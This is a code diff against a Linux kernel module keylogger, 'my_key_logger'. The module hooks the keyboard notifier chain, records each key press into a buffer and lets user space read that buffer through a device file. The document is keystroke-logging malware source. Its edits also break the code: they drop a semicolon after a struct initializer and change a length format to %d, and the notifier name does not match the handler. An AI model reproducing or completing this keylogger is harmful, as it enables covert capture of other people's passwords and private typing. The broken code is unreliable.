@@ -48,7 +48,7 @@ static struct file_operations fops = {
 // set notifier
 static struct notifier_block nb = {
   .notifier_call = keys_pressed,
-};
+}
 
 static int __init my_key_logger_init(void){
   printk(KERN_INFO "MKL: %s is Loaded!", module_name);
@@ -103,7 +103,7 @@ static ssize_t dev_read(struct file *file_p, char *buffer, size_t length, loff_t
   int error_count = copy_to_user(buffer, log, len);
 
   if (error_count == 0) {
-    printk(KERN_INFO "%s: Send %lu characters.\n", CLASS_NAME, len);
+    printk(KERN_INFO "%s: Send %d characters.\n", CLASS_NAME, len);
     memset(log, 0, LOG_MAX);
     log_p = log;
     
@@ -124,8 +124,8 @@ static int dev_release(struct inode *inode_p, struct file *file_p) {
   return 0;
 }
 
-static int key_pressed(struct notifier_block *nb, unsigned long action, void *data){
-  struct keyboard_notifier_param *param = (keyboard_notifier_param *)data;
+static int key_pressed(struct notifier_block *nb, unsigned long action, void *data) {
+  struct keyboard_notifier_param *param = data;
 
   if (action == KBD_KEYSYM && param->down) {
     char c = param->value;
